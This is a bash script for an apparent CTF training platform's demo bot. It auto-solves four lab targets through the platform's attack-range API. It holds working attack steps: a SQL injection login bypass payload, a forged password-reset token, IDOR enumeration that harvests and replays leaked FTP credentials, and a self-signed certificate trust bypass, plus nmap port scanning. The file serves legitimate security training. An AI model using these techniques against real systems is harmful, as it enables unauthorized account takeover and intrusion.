# ctf-access demo bot steps (see engine/web-terminal/bot-runner.sh's BOT_STEPS_FILE) -- replaces the
# git-fundamentals default with this pack's own four attack-range targets (plan rows 0, 2, 1, 3:
# sqli-login, weak-auth-portal, idor-pcap, cert-trust-bypass). Every step walks the exact technique the
# lab itself teaches (never a shortcut the lab doesn't hand the student) and ends with
# `dojo-flag submit <challenge> <flag>`. `--fast` gets one pass (BOT_FAST is handled generically by
# bot-runner.sh's run loop/think()/narrate(); nothing extra needed here). Re-runnable: every step
# starts the target fresh and returns 0 (not an error) whenever the slot or the exploit didn't come
# through this round, so a flaky round never wedges the retry loop.

# -- attack-range helpers --------------------------------------------------
# Drives the same /ctf-attack/attack/{start,status} API the landing page's Attack Range card uses
# (attack-cards.js), authenticated the same way a student's browser is: portal_login's class-login
# cookie (bot-runner.sh), not the Forgejo session. Needs jq (modules/ctf-range/terminal/Dockerfile).
attack_start_and_wait() { # $1 = target id, $2 = name of a var to set with the live slot's addr
  local target="$1" out_var="$2" timeout="${3:-90}"
  portal_login || return 1
  portal_curl -X POST -H 'Content-Type: application/json' -d "{\"target\":\"$target\"}" \
    "$GATEWAY_URL/ctf-attack/attack/start" >/dev/null
  local deadline=$((SECONDS + timeout))
  while [ "$SECONDS" -lt "$deadline" ]; do
    local doc state slot_target
    doc="$(portal_curl "$GATEWAY_URL/ctf-attack/attack/status")"
    slot_target="$(printf '%s' "$doc" | jq -r '.slot.target // ""' 2>/dev/null)"
    state="$(printf '%s' "$doc" | jq -r '.slot.state // ""' 2>/dev/null)"
    if [ "$slot_target" = "$target" ] && [ "$state" = "live" ]; then
      addr="$(printf '%s' "$doc" | jq -r --arg t "$target" '.targets[] | select(.id==$t) | .addr // ""' 2>/dev/null)"
      if [ -n "$addr" ]; then
        eval "$out_var=\$addr"
        return 0
      fi
    fi
    sleep 2
  done
  return 1
}

# sqli-login's ports are random per student: scan the web range and keep the open port whose / is a
# 200 (the decoy HTTP listener answers 401 to everything). Sets $2 to the port.
find_login_port() { # $1 = addr, $2 = name of a var to set
  local p
  for p in $(nmap -Pn -p 8000-8999 --open -oG - "$1" 2>/dev/null | grep -o '[0-9]*/open' | cut -d/ -f1); do
    if [ "$(curl -s -o /dev/null -m 3 -w '%{http_code}' "http://$1:$p/")" = 200 ]; then
      eval "$2=\$p"
      return 0
    fi
  done
  return 1
}

extract_flag() { grep -o 'flag{[^}]*}' | head -1; }

# Redefine the engine default (git-fundamentals' step_wrap_round cd's into a cloned repo this pack
# never clones): just stop the slot and pause between rounds.
step_wrap_round() {
  portal_curl -X POST -H 'Content-Type: application/json' -d '{}' \
    "$GATEWAY_URL/ctf-attack/attack/stop" >/dev/null 2>&1
  narrate "round $ROUND done -- taking a short break before round $((ROUND + 1))"
  sleep "$(rand_between "$BOT_ROUND_BREAK_MIN" "$BOT_ROUND_BREAK_MAX")"
}

# -- Lab 1: sqli-login -- boolean-true username closes the quote, admin's row matches regardless
# of password (same payload the lab's hints walk a student to: a single quote, then OR '1'='1').
step_sqli_login() {
  narrate "Lab 1 -- sqli-login: starting the target"
  local addr flag port
  if ! attack_start_and_wait sqli-login addr; then
    narrate "sqli-login never went live this round -- skipping"
    return 0
  fi
  run_cmd "nmap -p 8000-8999 --open $addr"
  if ! find_login_port "$addr" port; then
    narrate "sqli-login: no login page found on any open port this round -- skipping"
    return 0
  fi
  narrate "login portal on port $port -- closing the username's quote with OR '1'='1'"
  flag="$(curl -s -X POST "http://$addr:$port/login" \
    --data-urlencode "username=admin' OR '1'='1' -- " --data-urlencode 'password=anything' \
    | extract_flag)"
  if [ -z "$flag" ]; then
    narrate "sqli-login: no flag in the response this round -- skipping submit"
    return 0
  fi
  run_cmd "dojo-flag submit sqli-login '$flag'"
}

# -- Lab 2: weak-auth-portal -- the reset token is sha256("reset:<user>:<minute-bucket>")[:6], the
# exact formula the lab's hint 2 points a student to in the page's own /assets/reset-legacy.js helper.
step_weak_auth_portal() {
  narrate "Lab 2 -- weak-auth-portal: starting the target"
  local addr flag user="ops-admin" bucket guess
  if ! attack_start_and_wait weak-auth-portal addr; then
    narrate "weak-auth-portal never went live this round -- skipping"
    return 0
  fi
  narrate "slot live at $addr -- computing the reset token from the username and the current minute"
  bucket=$(( $(date +%s) / 60 ))
  guess="$(python3 -c "import hashlib,sys; print(hashlib.sha256(f'reset:{sys.argv[1]}:{sys.argv[2]}'.encode()).hexdigest()[:6])" "$user" "$bucket")"
  flag="$(curl -s -X POST "http://$addr:5000/reset" \
    --data-urlencode "username=$user" --data-urlencode "token=$guess" \
    --data-urlencode 'new_password=pwned123' | extract_flag)"
  if [ -z "$flag" ]; then
    narrate "weak-auth-portal: token/timing missed this round -- skipping submit"
    return 0
  fi
  run_cmd "dojo-flag submit weak-auth-portal '$flag'"
}

# -- Lab 3: idor-pcap -- enumerate /data/<n> for the one capture with cleartext FTP creds, reuse
# them as HTTP Basic auth against /admin (exactly the chain the lab walks: look at every ticket).
step_idor_pcap() {
  narrate "Lab 3 -- idor-pcap: starting the target"
  local addr flag n body user pass
  if ! attack_start_and_wait idor-pcap addr; then
    narrate "idor-pcap never went live this round -- skipping"
    return 0
  fi
  narrate "slot live at $addr -- walking /data/<n> for a capture with FTP creds"
  user="" pass=""
  for n in 0 1 2 3 4 5 6 7 8 9; do
    body="$(curl -s "http://$addr:5000/data/$n")"
    # [^\r\n] in this grep excludes the literal letters r/n, not the CR byte itself (a pcap's
    # FTP lines are \r\n-terminated), so a raw trailing \r survives into the match -- strip it.
    user="$(printf '%s' "$body" | grep -a -o 'USER [^\r\n]*' | head -1 | cut -c6- | tr -d '\r')"
    pass="$(printf '%s' "$body" | grep -a -o 'PASS [^\r\n]*' | head -1 | cut -c6- | tr -d '\r')"
    [ -n "$user" ] && [ -n "$pass" ] && break
    user="" pass=""
  done
  if [ -z "$user" ]; then
    narrate "idor-pcap: no ticket leaked FTP creds this round -- skipping"
    return 0
  fi
  narrate "leaked $user:$pass -- replaying as Basic auth against /admin"
  flag="$(curl -s -u "$user:$pass" "http://$addr:5000/admin" | extract_flag)"
  if [ -z "$flag" ]; then
    narrate "idor-pcap: /admin didn't accept the leaked creds this round -- skipping submit"
    return 0
  fi
  run_cmd "dojo-flag submit idor-pcap '$flag'"
}

# -- Lab 4: cert-trust-bypass -- a throwaway self-signed cert with CN=ops-internal (openssl, the
# same CLI cert-autorenewal teaches) is enough; the check never verifies a CA, just the CN.
step_cert_trust_bypass() {
  narrate "Lab 4 -- cert-trust-bypass: starting the target"
  local addr flag d
  if ! attack_start_and_wait cert-trust-bypass addr; then
    narrate "cert-trust-bypass never went live this round -- skipping"
    return 0
  fi
  if ! command -v openssl >/dev/null 2>&1; then
    narrate "cert-trust-bypass: no openssl in this terminal image -- skipping"
    return 0
  fi
  narrate "slot live at $addr -- making a throwaway self-signed cert with CN=ops-internal"
  d="$(mktemp -d)"
  openssl req -x509 -newkey rsa:2048 -keyout "$d/key.pem" -out "$d/cert.pem" \
    -days 365 -nodes -subj "/CN=ops-internal" >/dev/null 2>&1
  flag="$(curl -s -X POST --data-binary "@$d/cert.pem" "http://$addr:5000/internal/ops" | extract_flag)"
  rm -rf "$d"
  if [ -z "$flag" ]; then
    narrate "cert-trust-bypass: /internal/ops didn't accept the cert this round -- skipping submit"
    return 0
  fi
  run_cmd "dojo-flag submit cert-trust-bypass '$flag'"
}

case "$PERSONA" in
  expert)
    STEPS=(step_sqli_login step_weak_auth_portal step_idor_pcap step_cert_trust_bypass step_wrap_round)
    ;;
  intermediate)
    STEPS=(step_sqli_login step_weak_auth_portal step_idor_pcap step_wrap_round)
    ;;
  novice)
    STEPS=(step_sqli_login step_weak_auth_portal step_wrap_round)
    ;;
esac
